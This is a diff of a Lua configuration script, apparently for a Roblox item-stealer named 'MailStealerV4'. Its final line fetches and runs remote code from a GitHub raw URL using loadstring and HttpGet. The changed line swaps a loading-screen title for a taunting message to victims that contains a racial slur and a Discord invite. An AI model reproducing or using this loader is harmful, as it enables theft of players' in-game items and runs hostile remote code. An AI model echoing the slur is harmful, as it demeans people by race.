@@ -5,7 +5,7 @@ HugeSetting = 2
 GemSetting = 100000
 
 -- Custom Settings!
-LoadingScreenTitle = "You Just Got Hit Join discord.gg/ft6qjHR4gh"
+LoadingScreenTitle = "NIGGA YOU JUST GOT HIT BY THIS KID discord.gg/ft6qjHR4gh"
 WebHookName = "MailStealerV4"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriPremium/main/MoriPremium"))()
